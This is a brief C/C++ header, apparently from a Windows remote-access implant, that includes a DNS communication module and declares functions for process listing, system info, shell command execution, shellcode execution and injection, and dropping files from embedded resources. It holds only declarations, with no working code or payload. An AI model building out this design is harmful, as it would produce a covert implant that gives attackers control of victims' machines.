#include "DNSCommunication.h"

LPCSTR ProcessList();
LPCSTR SystemInfo();
LPCSTR ExecuteShellcode();
LPCSTR ExecuteShell(LPCSTR command);
LPSTR AgentName();

DWORD WINAPI InjectShellcode(LPVOID lpData);
BOOL DropFileFromRes(LPCSTR fileName,DWORD resourceId);